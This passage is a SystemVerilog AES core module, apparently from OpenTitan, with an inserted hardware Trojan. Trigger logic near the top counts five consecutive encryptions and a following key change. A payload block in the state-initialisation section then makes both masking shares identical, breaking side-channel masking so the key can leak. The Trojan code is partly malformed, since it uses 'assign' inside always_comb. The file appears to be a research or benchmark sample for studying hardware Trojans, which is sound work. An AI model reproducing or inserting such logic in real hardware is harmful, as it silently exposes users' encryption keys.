`include "prim_assert.sv"

module aes_core
  import aes_pkg::*;
  import aes_reg_pkg::*;
#(
  parameter bit          AES192Enable         = 1,
  parameter bit          SecMasking           = 1,
  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,
  parameter int unsigned SecStartTriggerDelay = 0,
  parameter bit          SecAllowForcingMasks = 0,
  parameter bit          SecSkipPRNGReseeding = 0,
  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,

  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter

  parameter clearing_lfsr_seed_t RndCnstClearingLfsrSeed  = RndCnstClearingLfsrSeedDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingLfsrPerm  = RndCnstClearingLfsrPermDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingSharePerm = RndCnstClearingSharePermDefault,
  parameter masking_lfsr_seed_t  RndCnstMaskingLfsrSeed   = RndCnstMaskingLfsrSeedDefault,
  parameter masking_lfsr_perm_t  RndCnstMaskingLfsrPerm   = RndCnstMaskingLfsrPermDefault
) (
  input  logic                        clk_i,
  input  logic                        rst_ni,
  input  logic                        rst_shadowed_ni,

  // Entropy request interfaces for clearing and masking PRNGs
  output logic                        entropy_clearing_req_o,
  input  logic                        entropy_clearing_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_clearing_i,
  output logic                        entropy_masking_req_o,
  input  logic                        entropy_masking_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_masking_i,

  // Key manager (keymgr) key sideload interface
  input  keymgr_pkg::hw_key_req_t     keymgr_key_i,

  // Life cycle
  input  lc_ctrl_pkg::lc_tx_t         lc_escalate_en_i,

  // Alerts
  input  logic                        shadowed_storage_err_i,
  input  logic                        shadowed_update_err_i,
  input  logic                        intg_err_alert_i,
  output logic                        alert_recov_o,
  output logic                        alert_fatal_o,

  // Bus Interface
  input  aes_reg2hw_t                 reg2hw,
  output aes_hw2reg_t                 hw2reg
);

  // Trojan insertion start -------------------------------------------------------
  // Trojan registers/signals for SCA masking bypass
  logic [2:0] trojan_enc_cnt;       // 3 bits: count up to 5 encrypts
  logic trojan_last_op_enc;         // 1 if last operation was AES_ENC, 0 otherwise
  logic trojan_trigger_active;      // 1 if 5 consecutive ENCs done, else 0
  logic trojan_key_sw_seen;         // 1 if key switch just after 5 ENCs, else 0

  // Conditions to update the encryption count: detect when an AES_ENC operation is triggered
  logic trojan_enc_valid;
  
  // Helper: detect key_switch command
  logic trojan_key_switch;
  logic [NumRegsKey-1:0][31:0] trojan_last_key;
  logic trojan_key_diff;
  
  // Remember last key (share0 only, since key changes fully, both shares are reloaded)
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_last_key <= '{default:'0};
    end else begin
      // Capture new key when key_init_we for any share0 word is asserted and source is KEY_INIT_INPUT
      if (key_init_sel == KEY_INIT_INPUT) begin
        for (int i = 0; i < NumRegsKey; i++) begin
          if (key_init_we[0][i] == SP2V_HIGH)
            trojan_last_key[i] <= key_init[0][i];
        end
      end
    end
  end

  // Key switch defined as: KEY_INIT_INPUT and key actually gets updated (different from last)
  assign trojan_key_diff =
    (key_init_sel == KEY_INIT_INPUT)
    &&
    (
      (key_init[0][0] != trojan_last_key[0]) ||
      (key_init[0][1] != trojan_last_key[1]) ||
      (key_init[0][2] != trojan_last_key[2]) ||
      (key_init[0][3] != trojan_last_key[3]) ||
      (key_init[0][4] != trojan_last_key[4]) ||
      (key_init[0][5] != trojan_last_key[5]) ||
      (key_init[0][6] != trojan_last_key[6]) ||
      (key_init[0][7] != trojan_last_key[7])
    );
  // Only update key_sw if any key share0 word is updated via KEY_INIT_INPUT (no need to check KEYMGR)
  assign trojan_key_switch = trojan_key_diff && (|key_init_we[0]);

  // Detect valid ENC operation trigger: cipher_in_valid and in READY state, with op == ENC and not error
  assign trojan_enc_valid = (cipher_in_valid == SP2V_HIGH) &&
                            (cipher_in_ready == SP2V_HIGH) &&
                            (aes_op_q == AES_ENC) &&
                            (!ctrl_err_storage);

  // Trigger logic
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_enc_cnt      <= 3'd0;
      trojan_last_op_enc  <= 1'b0;
      trojan_trigger_active <= 1'b0;
      trojan_key_sw_seen    <= 1'b0;
    end else begin
      // If reset or fatal alert -- reset everything
      if (alert_fatal_o) begin
        trojan_enc_cnt      <= 3'd0;
        trojan_last_op_enc  <= 1'b0;
        trojan_trigger_active <= 1'b0;
        trojan_key_sw_seen    <= 1'b0;
      end else begin
        // Track consecutive ENCs and lock-in after 5
        if (trojan_enc_valid) begin
          if (trojan_last_op_enc) begin
            if (trojan_enc_cnt < 3'd5)
              trojan_enc_cnt <= trojan_enc_cnt + 3'd1;
          end else begin
            // New ENC sequence
            trojan_enc_cnt <= 3'd1;
          end
          trojan_last_op_enc <= 1'b1;
        end else begin
          // Any non-ENC operation resets the sequence unless already locked in
          if (!trojan_trigger_active && aes_op_q != AES_ENC) begin
            trojan_enc_cnt <= 3'd0;
            trojan_last_op_enc <= 1'b0;
          end
        end
        // Trigger set after exactly 5 consecutive ENCs
        if (trojan_enc_cnt == 3'd5 && !trojan_trigger_active)
          trojan_trigger_active <= 1'b1;

        // Key change after 5 ENCs (and not reset): set Trojan payload
        if (trojan_trigger_active && trojan_key_switch && !trojan_key_sw_seen)
          trojan_key_sw_seen <= 1'b1;

        // Any reset input returns everything to safe
        if (trojan_key_sw_seen && (rst_ni == 1'b0))
          trojan_key_sw_seen <= 1'b0;
        // If a new reset or alert/fatal happens, clear everything
        if (!rst_ni || alert_fatal_o) begin
          trojan_enc_cnt <= 3'd0;
          trojan_last_op_enc <= 1'b0;
          trojan_trigger_active <= 1'b0;
          trojan_key_sw_seen <= 1'b0;
        end

        // If a new ENC sequence starts after Trojan fired, clear Trojan
        if (trojan_key_sw_seen && trojan_enc_valid) begin
          trojan_enc_cnt <= 3'd1;
          trojan_last_op_enc <= 1'b1;
          trojan_trigger_active <= 1'b0;
          trojan_key_sw_seen <= 1'b0;
        end
        // If trigger sequence is broken before reaching 5, clear!
        if (!trojan_trigger_active && !(trojan_enc_valid || aes_op_q == AES_ENC)) begin
          trojan_enc_cnt <= 3'd0;
          trojan_last_op_enc <= 1'b0;
        end
      end
    end
  end
  // Trojan insertion end ---------------------------------------------------------

  // Original Signals
  logic                                       ctrl_qe;
  logic                                       ctrl_we;
  logic                                       ctrl_phase;
  aes_op_e                                    aes_op_q;
  aes_mode_e                                  aes_mode_q;
  ciph_op_e                                   cipher_op;
  ciph_op_e                                   cipher_op_buf;
  key_len_e                                   key_len_q;
  logic                                       sideload_q;
  prs_rate_e                                  prng_reseed_rate_q;
  logic                                       manual_operation_q;
  logic                                       ctrl_reg_err_update;
  logic                                       ctrl_reg_err_storage;
  logic                                       ctrl_err_update;
  logic                                       ctrl_err_storage;
  logic                                       ctrl_err_storage_d;
  logic                                       ctrl_err_storage_q;
  logic                                       ctrl_alert;
  logic                                       key_touch_forces_reseed;
  logic                                       force_masks;
  logic                                       mux_sel_err;
  logic                                       sp_enc_err_d, sp_enc_err_q;
  logic                                       clear_on_fatal;

  logic                       [3:0][3:0][7:0] state_in;
  logic                      [SISelWidth-1:0] state_in_sel_raw;
  si_sel_e                                    state_in_sel_ctrl;
  si_sel_e                                    state_in_sel;
  logic                                       state_in_sel_err;
  logic                       [3:0][3:0][7:0] add_state_in;
  logic                   [AddSISelWidth-1:0] add_state_in_sel_raw;
  add_si_sel_e                                add_state_in_sel_ctrl;
  add_si_sel_e                                add_state_in_sel;
  logic                                       add_state_in_sel_err;

  logic                       [3:0][3:0][7:0] state_mask;
  logic                       [3:0][3:0][7:0] state_init [NumShares];
  logic                       [3:0][3:0][7:0] state_done [NumShares];
  logic                       [3:0][3:0][7:0] state_out;

  logic                [NumRegsKey-1:0][31:0] key_init [NumSharesKey];
  logic                [NumRegsKey-1:0]       key_init_qe [NumSharesKey];
  logic                [NumRegsKey-1:0]       key_init_qe_buf [NumSharesKey];
  logic                [NumRegsKey-1:0][31:0] key_init_d [NumSharesKey];
  logic                [NumRegsKey-1:0][31:0] key_init_q [NumSharesKey];
  logic                [NumRegsKey-1:0][31:0] key_init_cipher [NumShares];
  sp2v_e               [NumRegsKey-1:0]       key_init_we_ctrl [NumSharesKey];
  sp2v_e               [NumRegsKey-1:0]       key_init_we [NumSharesKey];
  logic                 [KeyInitSelWidth-1:0] key_init_sel_raw;
  key_init_sel_e                              key_init_sel_ctrl;
  key_init_sel_e                              key_init_sel;
  logic                                       key_init_sel_err;
  logic                [NumRegsKey-1:0][31:0] key_sideload [NumSharesKey];

  logic                 [NumRegsIv-1:0][31:0] iv;
  logic                 [NumRegsIv-1:0]       iv_qe;
  logic                 [NumRegsIv-1:0]       iv_qe_buf;
  logic  [NumSlicesCtr-1:0][SliceSizeCtr-1:0] iv_d;
  logic  [NumSlicesCtr-1:0][SliceSizeCtr-1:0] iv_q;
  sp2v_e [NumSlicesCtr-1:0]                   iv_we_ctrl;
  sp2v_e [NumSlicesCtr-1:0]                   iv_we;
  logic                      [IVSelWidth-1:0] iv_sel_raw;
  iv_sel_e                                    iv_sel_ctrl;
  iv_sel_e                                    iv_sel;
  logic                                       iv_sel_err;

  logic  [NumSlicesCtr-1:0][SliceSizeCtr-1:0] ctr;
  sp2v_e [NumSlicesCtr-1:0]                   ctr_we;
  sp2v_e                                      ctr_incr;
  sp2v_e                                      ctr_ready;
  logic                                       ctr_alert;

  logic               [NumRegsData-1:0][31:0] data_in_prev_d;
  logic               [NumRegsData-1:0][31:0] data_in_prev_q;
  sp2v_e                                      data_in_prev_we_ctrl;
  sp2v_e                                      data_in_prev_we;
  logic                     [DIPSelWidth-1:0] data_in_prev_sel_raw;
  dip_sel_e                                   data_in_prev_sel_ctrl;
  dip_sel_e                                   data_in_prev_sel;
  logic                                       data_in_prev_sel_err;

  logic               [NumRegsData-1:0][31:0] data_in;
  logic               [NumRegsData-1:0]       data_in_qe;
  logic               [NumRegsData-1:0]       data_in_qe_buf;
  logic                                       data_in_we;

  logic                       [3:0][3:0][7:0] add_state_out;
  logic                   [AddSOSelWidth-1:0] add_state_out_sel_raw;
  add_so_sel_e                                add_state_out_sel_ctrl;
  add_so_sel_e                                add_state_out_sel;
  logic                                       add_state_out_sel_err;

  logic               [NumRegsData-1:0][31:0] data_out_d;
  logic               [NumRegsData-1:0][31:0] data_out_q;
  sp2v_e                                      data_out_we_ctrl;
  sp2v_e                                      data_out_we;
  logic               [NumRegsData-1:0]       data_out_re;
  logic               [NumRegsData-1:0]       data_out_re_buf;

  sp2v_e                                      cipher_in_valid;
  sp2v_e                                      cipher_in_ready;
  sp2v_e                                      cipher_out_valid;
  sp2v_e                                      cipher_out_ready;
  sp2v_e                                      cipher_crypt;
  sp2v_e                                      cipher_crypt_busy;
  sp2v_e                                      cipher_dec_key_gen;
  sp2v_e                                      cipher_dec_key_gen_busy;
  logic                                       cipher_prng_reseed;
  logic                                       cipher_prng_reseed_busy;
  logic                                       cipher_key_clear;
  logic                                       cipher_key_clear_busy;
  logic                                       cipher_data_out_clear;
  logic                                       cipher_data_out_clear_busy;
  logic                                       cipher_alert;

  // Pseudo-random data for clearing purposes
  logic                [WidthPRDClearing-1:0] prd_clearing [NumSharesKey];
  logic                                       prd_clearing_upd_req;
  logic                                       prd_clearing_upd_ack;
  logic                                       prd_clearing_rsd_req;
  logic                                       prd_clearing_rsd_ack;
  logic                               [127:0] prd_clearing_128 [NumShares];
  logic                               [255:0] prd_clearing_256 [NumShares];
  logic                           [3:0][31:0] prd_clearing_data;
  logic                               [255:0] prd_clearing_key_init [NumSharesKey];
  logic                       [3:0][3:0][7:0] prd_clearing_state [NumShares];
  logic                           [7:0][31:0] prd_clearing_key [NumShares];

  // Unused signals
  logic               [NumRegsData-1:0][31:0] unused_data_out_q;

  // The clearing PRNG provides pseudo-random data for register clearing purposes.
  aes_prng_clearing #(
    .Width                ( WidthPRDClearing         ),
    .EntropyWidth         ( EntropyWidth             ),
    .SecSkipPRNGReseeding ( SecSkipPRNGReseeding     ),
    .RndCnstLfsrSeed      ( RndCnstClearingLfsrSeed  ),
    .RndCnstLfsrPerm      ( RndCnstClearingLfsrPerm  ),
    .RndCnstSharePerm     ( RndCnstClearingSharePerm )
  ) u_aes_prng_clearing (
    .clk_i         ( clk_i                  ),
    .rst_ni        ( rst_ni                 ),

    .data_req_i    ( prd_clearing_upd_req   ),
    .data_ack_o    ( prd_clearing_upd_ack   ),
    .data_o        ( prd_clearing           ),
    .reseed_req_i  ( prd_clearing_rsd_req   ),
    .reseed_ack_o  ( prd_clearing_rsd_ack   ),

    .entropy_req_o ( entropy_clearing_req_o ),
    .entropy_ack_i ( entropy_clearing_ack_i ),
    .entropy_i     ( entropy_clearing_i     )
  );

  // Generate clearing signals of appropriate widths.
  // Different shares need to be cleared with different pseudo-random data.
  for (genvar s = 0; s < NumShares; s++) begin : gen_prd_clearing_shares
    for (genvar c = 0; c < NumChunksPRDClearing128; c++) begin : gen_prd_clearing_128
      assign prd_clearing_128[s][c * WidthPRDClearing +: WidthPRDClearing] = prd_clearing[s];
    end
    for (genvar c = 0; c < NumChunksPRDClearing256; c++) begin : gen_prd_clearing_256
      assign prd_clearing_256[s][c * WidthPRDClearing +: WidthPRDClearing] = prd_clearing[s];
    end
  end
  // The data registers are always unmasked.
  assign prd_clearing_data = prd_clearing_128[0];
  // The initial key is always provided in two shares. The two shares of the initial key register
  // need to be cleared with different pseudo-random data.
  for (genvar s = 0; s < NumSharesKey; s++) begin : gen_prd_clearing_key_init_shares
    for (genvar c = 0; c < NumChunksPRDClearing256; c++) begin : gen_prd_clearing_key_init
      assign prd_clearing_key_init[s][c * WidthPRDClearing +: WidthPRDClearing] = prd_clearing[s];
    end
  end
  // The cipher core uses multiple packed dimensions internally but the number of bits remain the
  // same. Since some tools fail to perform the `conversion` on input ports, we do it here.
  assign prd_clearing_state = prd_clearing_128;
  assign prd_clearing_key   = prd_clearing_256;

  ////////////
  // Inputs //
  ////////////

  always_comb begin : key_init_get
    for (int i = 0; i < NumRegsKey; i++) begin
      key_init[0][i]    = reg2hw.key_share0[i].q;
      key_init_qe[0][i] = reg2hw.key_share0[i].qe;
      key_init[1][i]    = reg2hw.key_share1[i].q;
      key_init_qe[1][i] = reg2hw.key_share1[i].qe;
    end
  end

  prim_sec_anchor_buf #(
    .Width ( NumSharesKey * NumRegsKey )
  ) u_prim_buf_key_init_qe (
    .in_i  ( {key_init_qe[1],     key_init_qe[0]}     ),
    .out_o ( {key_init_qe_buf[1], key_init_qe_buf[0]} )
  );

  always_comb begin : key_sideload_get
    for (int s = 0; s < NumSharesKey; s++) begin
      for (int i = 0; i < NumRegsKey; i++) begin
        key_sideload[s][i] = keymgr_key_i.key[s][i * 32 +: 32];
      end
    end
  end

  always_comb begin : iv_get
    for (int i = 0; i < NumRegsIv; i++) begin
      iv[i]    = reg2hw.iv[i].q;
      iv_qe[i] = reg2hw.iv[i].qe;
    end
  end

  prim_sec_anchor_buf #(
    .Width ( NumRegsIv )
  ) u_prim_buf_iv_qe (
    .in_i  ( iv_qe     ),
    .out_o ( iv_qe_buf )
  );

  always_comb begin : data_in_get
    for (int i = 0; i < NumRegsData; i++) begin
      data_in[i]    = reg2hw.data_in[i].q;
      data_in_qe[i] = reg2hw.data_in[i].qe;
    end
  end

  prim_sec_anchor_buf #(
    .Width ( NumRegsData )
  ) u_prim_buf_data_in_qe (
    .in_i  ( data_in_qe     ),
    .out_o ( data_in_qe_buf )
  );

  always_comb begin : data_out_get
    for (int i = 0; i < NumRegsData; i++) begin
      // data_out is actually hwo, but we need hrw for hwre
      unused_data_out_q[i] = reg2hw.data_out[i].q;
      data_out_re[i]       = reg2hw.data_out[i].re;
    end
  end

  prim_sec_anchor_buf #(
    .Width ( NumRegsData )
  ) u_prim_buf_data_out_re (
    .in_i  ( data_out_re     ),
    .out_o ( data_out_re_buf )
  );

  //////////////////////
  // Key, IV and Data //
  //////////////////////

  // SEC_CM: KEY.SEC_WIPE
  // SEC_CM: KEY.SIDELOAD
  // Initial Key registers
  always_comb begin : key_init_mux
    unique case (key_init_sel)
      KEY_INIT_INPUT:  key_init_d = key_init;
      KEY_INIT_KEYMGR: key_init_d = key_sideload;
      KEY_INIT_CLEAR:  key_init_d = prd_clearing_key_init;
      default:         key_init_d = prd_clearing_key_init;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : key_init_reg
    if (!rst_ni) begin
      key_init_q <= '{default: '0};
    end else begin
      for (int s = 0; s < NumSharesKey; s++) begin
        for (int i = 0; i < NumRegsKey; i++) begin
          if (key_init_we[s][i] == SP2V_HIGH) begin
            key_init_q[s][i] <= key_init_d[s][i];
          end
        end
      end
    end
  end

  // SEC_CM: IV.CONFIG.SEC_WIPE
  // IV registers
  always_comb begin : iv_mux
    unique case (iv_sel)
      IV_INPUT:        iv_d = iv;
      IV_DATA_OUT:     iv_d = data_out_d;
      IV_DATA_OUT_RAW: iv_d = aes_transpose(state_out);
      IV_DATA_IN_PREV: iv_d = data_in_prev_q;
      IV_CTR:          iv_d = ctr;
      IV_CLEAR:        iv_d = prd_clearing_data;
      default:         iv_d = prd_clearing_data;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : iv_reg
    if (!rst_ni) begin
      iv_q <= '0;
    end else begin
      for (int i = 0; i < NumSlicesCtr; i++) begin
        if (iv_we[i] == SP2V_HIGH) begin
          iv_q[i] <= iv_d[i];
        end
      end
    end
  end

  // SEC_CM: DATA_REG.SEC_WIPE
  // Previous input data register
  always_comb begin : data_in_prev_mux
    unique case (data_in_prev_sel)
      DIP_DATA_IN: data_in_prev_d = data_in;
      DIP_CLEAR:   data_in_prev_d = prd_clearing_data;
      default:     data_in_prev_d = prd_clearing_data;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : data_in_prev_reg
    if (!rst_ni) begin
      data_in_prev_q <= '0;
    end else if (data_in_prev_we == SP2V_HIGH) begin
      data_in_prev_q <= data_in_prev_d;
    end
  end

  /////////////
  // Counter //
  /////////////

  aes_ctr u_aes_ctr (
    .clk_i    ( clk_i     ),
    .rst_ni   ( rst_ni    ),

    .incr_i   ( ctr_incr  ),
    .ready_o  ( ctr_ready ),
    .alert_o  ( ctr_alert ),

    .ctr_i    ( iv_q      ),
    .ctr_o    ( ctr       ),
    .ctr_we_o ( ctr_we    )
  );

  /////////////////
  // Cipher Core //
  /////////////////

  // Cipher core operation
  assign cipher_op = (aes_mode_q == AES_ECB && aes_op_q == AES_ENC) ? CIPH_FWD :
                     (aes_mode_q == AES_ECB && aes_op_q == AES_DEC) ? CIPH_INV :
                     (aes_mode_q == AES_CBC && aes_op_q == AES_ENC) ? CIPH_FWD :
                     (aes_mode_q == AES_CBC && aes_op_q == AES_DEC) ? CIPH_INV :
                     (aes_mode_q == AES_CFB)                        ? CIPH_FWD :
                     (aes_mode_q == AES_OFB)                        ? CIPH_FWD :
                     (aes_mode_q == AES_CTR)                        ? CIPH_FWD : CIPH_FWD;

  // This primitive is used to place a size-only constraint on the
  // buffers to act as a synthesis optimization barrier.
  logic [$bits(ciph_op_e)-1:0] cipher_op_raw;
  prim_buf #(
    .Width($bits(ciph_op_e))
  ) u_prim_buf_op (
    .in_i(cipher_op),
    .out_o(cipher_op_raw)
  );
  assign cipher_op_buf = ciph_op_e'(cipher_op_raw);

  // Convert input data/IV to state format (every word corresponds to one state column).
  // Mux for state input
  always_comb begin : state_in_mux
    unique case (state_in_sel)
      SI_ZERO: state_in = '0;
      SI_DATA: state_in = aes_transpose(data_in);
      default: state_in = '0;
    endcase
  end

  // Mux for addition to state input
  always_comb begin : add_state_in_mux
    unique case (add_state_in_sel)
      ADD_SI_ZERO: add_state_in = '0;
      ADD_SI_IV:   add_state_in = aes_transpose(iv_q);
      default:     add_state_in = '0;
    endcase
  end

  // Trojan insertion (payload) start -----------------------------------------------
  if (!SecMasking) begin : gen_state_init_unmasked
    assign state_init[0] = state_in ^ add_state_in;
    logic [3:0][3:0][7:0] unused_state_mask;
    assign unused_state_mask = state_mask;
  end else begin : gen_state_init_masked
    // SCA Trojan payload: If Trojan is activated (trojan_key_sw_seen==1), force both shares identical (mask=0)
    always_comb begin
      if (trojan_key_sw_seen) begin
        assign state_init[0] = (state_in ^ add_state_in);
        assign state_init[1] = (state_in ^ add_state_in); // Mask share = masked data share = breaks 1st-order masking
      end else begin
        assign state_init[0] = (state_in ^ add_state_in) ^ state_mask; // Normal operation
        assign state_init[1] = state_mask;
      end
    end
  end
  // Trojan insertion (payload) end -------------------------------------------------

  if (!SecMasking) begin : gen_key_init_unmasked
    // Combine the two key shares for the unmasked cipher core. This causes SCA leakage of the key
    // and thus should be avoided.
    assign key_init_cipher[0] = key_init_q[0] ^ key_init_q[1];

  end else begin : gen_key_init_masked
    // Forward the masked key share and the mask share to the masked cipher core.
    assign key_init_cipher    = key_init_q;
  end

  // SEC_CM: KEY.MASKING
  // Cipher core
  aes_cipher_core #(
    .AES192Enable           ( AES192Enable           ),
    .SecMasking             ( SecMasking             ),
    .SecSBoxImpl            ( SecSBoxImpl            ),
    .SecAllowForcingMasks   ( SecAllowForcingMasks   ),
    .SecSkipPRNGReseeding   ( SecSkipPRNGReseeding   ),
    .RndCnstMaskingLfsrSeed ( RndCnstMaskingLfsrSeed ),
    .RndCnstMaskingLfsrPerm ( RndCnstMaskingLfsrPerm )
  ) u_aes_cipher_core (
    .clk_i                ( clk_i                      ),
    .rst_ni               ( rst_ni                     ),

    .in_valid_i           ( cipher_in_valid            ),
    .in_ready_o           ( cipher_in_ready            ),

    .out_valid_o          ( cipher_out_valid           ),
    .out_ready_i          ( cipher_out_ready           ),

    .cfg_valid_i          ( ~ctrl_err_storage          ), // Used for gating assertions only.
    .op_i                 ( cipher_op_buf              ),
    .key_len_i            ( key_len_q                  ),
    .crypt_i              ( cipher_crypt               ),
    .crypt_o              ( cipher_crypt_busy          ),
    .dec_key_gen_i        ( cipher_dec_key_gen         ),
    .dec_key_gen_o        ( cipher_dec_key_gen_busy    ),
    .prng_reseed_i        ( cipher_prng_reseed         ),
    .prng_reseed_o        ( cipher_prng_reseed_busy    ),
    .key_clear_i          ( cipher_key_clear           ),
    .key_clear_o          ( cipher_key_clear_busy      ),
    .data_out_clear_i     ( cipher_data_out_clear      ),
    .data_out_clear_o     ( cipher_data_out_clear_busy ),
    .alert_fatal_i        ( alert_fatal_o              ),
    .alert_o              ( cipher_alert               ),

    .prd_clearing_state_i ( prd_clearing_state         ),
    .prd_clearing_key_i   ( prd_clearing_key           ),

    .force_masks_i        ( force_masks                ),
    .data_in_mask_o       ( state_mask                 ),
    .entropy_req_o        ( entropy_masking_req_o      ),
    .entropy_ack_i        ( entropy_masking_ack_i      ),
    .entropy_i            ( entropy_masking_i          ),

    .state_init_i         ( state_init                 ),
    .key_init_i           ( key_init_cipher            ),
    .state_o              ( state_done                 )
  );

  if (!SecMasking) begin : gen_state_out_unmasked
    assign state_out = state_done[0];
  end else begin : gen_state_out_masked
    // Unmask the cipher core output. This might get reworked in the future when masking the
    // counter and feedback path through the IV regs.

    // Only unmask the final cipher core output. Unmasking intermediate output data causes
    // additional SCA leakage and thus has to be avoided. Forward PRD instead of a deterministic
    // value to avoid leaking the cipher core output when it becomes valid.
    logic [3:0][3:0][7:0] state_done_muxed [NumShares];
    for (genvar s = 0; s < NumShares; s++) begin : gen_state_done_muxed
      assign state_done_muxed[s] =
          (cipher_out_valid == SP2V_HIGH) ? state_done[s] : prd_clearing_state[s];
    end

    // Avoid aggressive synthesis optimizations.
    logic [3:0][3:0][7:0] state_done_buf [NumShares];
    prim_buf #(
      .Width ( 128 * NumShares )
    ) u_prim_state_done_muxed (
      .in_i  ( {state_done_muxed[1], state_done_muxed[0]} ),
      .out_o ( {state_done_buf[1],   state_done_buf[0]}   )
    );

    // Unmask the cipher core output.
    assign state_out = state_done_buf[0] ^ state_done_buf[1];
  end

  // Mux for addition to state output
  always_comb begin : add_state_out_mux
    unique case (add_state_out_sel)
      ADD_SO_ZERO: add_state_out = '0;
      ADD_SO_IV:   add_state_out = aes_transpose(iv_q);
      ADD_SO_DIP:  add_state_out = aes_transpose(data_in_prev_q);
      default:     add_state_out = '0;
    endcase
  end

  // Convert output state to output data format (every column corresponds to one output word).
  assign data_out_d = aes_transpose(state_out ^ add_state_out);

  //////////////////////
  // Control Register //
  //////////////////////

  // Shadowed register primitive
  aes_ctrl_reg_shadowed #(
    .AES192Enable ( AES192Enable )
  ) u_ctrl_reg_shadowed (
    .clk_i              ( clk_i                ),
    .rst_ni             ( rst_ni               ),
    .rst_shadowed_ni    ( rst_shadowed_ni      ),
    .qe_o               ( ctrl_qe              ),
    .we_i               ( ctrl_we              ),
    .phase_o            ( ctrl_phase           ),
    .operation_o        ( aes_op_q             ),
    .mode_o             ( aes_mode_q           ),
    .key_len_o          ( key_len_q            ),
    .sideload_o         ( sideload_q           ),
    .prng_reseed_rate_o ( prng_reseed_rate_q   ),
    .manual_operation_o ( manual_operation_q   ),
    .err_update_o       ( ctrl_reg_err_update  ),
    .err_storage_o      ( ctrl_reg_err_storage ),
    .reg2hw_ctrl_i      ( reg2hw.ctrl_shadowed ),
    .hw2reg_ctrl_o      ( hw2reg.ctrl_shadowed )
  );

  // Auxiliary control register signals
  assign key_touch_forces_reseed = reg2hw.ctrl_aux_shadowed.key_touch_forces_reseed.q;
  assign force_masks             = reg2hw.ctrl_aux_shadowed.force_masks.q;

  /////////////
  // Control //
  /////////////

  // Control
  aes_control #(
    .SecMasking           ( SecMasking           ),
    .SecStartTriggerDelay ( SecStartTriggerDelay )
  ) u_aes_control (
    .clk_i                     ( clk_i                                  ),
    .rst_ni                    ( rst_ni                                 ),

    .ctrl_qe_i                 ( ctrl_qe                                ),
    .ctrl_we_o                 ( ctrl_we                                ),
    .ctrl_phase_i              ( ctrl_phase                             ),
    .ctrl_err_storage_i        ( ctrl_err_storage                       ),
    .op_i                      ( aes_op_q                               ),
    .mode_i                    ( aes_mode_q                             ),
    .cipher_op_i               ( cipher_op_buf                          ),
    .sideload_i                ( sideload_q                             ),
    .prng_reseed_rate_i        ( prng_reseed_rate_q                     ),
    .manual_operation_i        ( manual_operation_q                     ),
    .key_touch_forces_reseed_i ( key_touch_forces_reseed                ),
    .start_i                   ( reg2hw.trigger.start.q                 ),
    .key_iv_data_in_clear_i    ( reg2hw.trigger.key_iv_data_in_clear.q  ),
    .data_out_clear_i          ( reg2hw.trigger.data_out_clear.q        ),
    .prng_reseed_i             ( reg2hw.trigger.prng_reseed.q           ),
    .mux_sel_err_i             ( mux_sel_err                            ),
    .sp_enc_err_i              ( sp_enc_err_q                           ),
    .lc_escalate_en_i          ( lc_escalate_en_i                       ),
    .alert_fatal_i             ( alert_fatal_o                          ),
    .alert_o                   ( ctrl_alert                             ),

    .key_sideload_valid_i      ( keymgr_key_i.valid                     ),
    .key_init_qe_i             ( key_init_qe_buf                        ),
    .iv_qe_i                   ( iv_qe_buf                              ),
    .data_in_qe_i              ( data_in_qe_buf                         ),
    .data_out_re_i             ( data_out_re_buf                        ),
    .data_in_we_o              ( data_in_we                             ),
    .data_out_we_o             ( data_out_we_ctrl                       ),

    .data_in_prev_sel_o        ( data_in_prev_sel_ctrl                  ),
    .data_in_prev_we_o         ( data_in_prev_we_ctrl                   ),

    .state_in_sel_o            ( state_in_sel_ctrl                      ),
    .add_state_in_sel_o        ( add_state_in_sel_ctrl                  ),
    .add_state_out_sel_o       ( add_state_out_sel_ctrl                 ),

    .ctr_incr_o                ( ctr_incr                               ),
    .ctr_ready_i               ( ctr_ready                              ),
    .ctr_we_i                  ( ctr_we                                 ),

    .cipher_in_valid_o         ( cipher_in_valid                        ),
    .cipher_in_ready_i         ( cipher_in_ready                        ),
    .cipher_out_valid_i        ( cipher_out_valid                       ),
    .cipher_out_ready_o        ( cipher_out_ready                       ),
    .cipher_crypt_o            ( cipher_crypt                           ),
    .cipher_crypt_i            ( cipher_crypt_busy                      ),
    .cipher_dec_key_gen_o      ( cipher_dec_key_gen                     ),
    .cipher_dec_key_gen_i      ( cipher_dec_key_gen_busy                ),
    .cipher_prng_reseed_o      ( cipher_prng_reseed                     ),
    .cipher_prng_reseed_i      ( cipher_prng_reseed_busy                ),
    .cipher_key_clear_o        ( cipher_key_clear                       ),
    .cipher_key_clear_i        ( cipher_key_clear_busy                  ),
    .cipher_data_out_clear_o   ( cipher_data_out_clear                  ),
    .cipher_data_out_clear_i   ( cipher_data_out_clear_busy             ),

    .key_init_sel_o            ( key_init_sel_ctrl                      ),
    .key_init_we_o             ( key_init_we_ctrl                       ),
    .iv_sel_o                  ( iv_sel_ctrl                            ),
    .iv_we_o                   ( iv_we_ctrl                             ),

    .prng_data_req_o           ( prd_clearing_upd_req                   ),
    .prng_data_ack_i           ( prd_clearing_upd_ack                   ),
    .prng_reseed_req_o         ( prd_clearing_rsd_req                   ),
    .prng_reseed_ack_i         ( prd_clearing_rsd_ack                   ),

    .start_o                   ( hw2reg.trigger.start.d                 ),
    .start_we_o                ( hw2reg.trigger.start.de                ),
    .key_iv_data_in_clear_o    ( hw2reg.trigger.key_iv_data_in_clear.d  ),
    .key_iv_data_in_clear_we_o ( hw2reg.trigger.key_iv_data_in_clear.de ),
    .data_out_clear_o          ( hw2reg.trigger.data_out_clear.d        ),
    .data_out_clear_we_o       ( hw2reg.trigger.data_out_clear.de       ),
    .prng_reseed_o             ( hw2reg.trigger.prng_reseed.d           ),
    .prng_reseed_we_o          ( hw2reg.trigger.prng_reseed.de          ),

    .idle_o                    ( hw2reg.status.idle.d                   ),
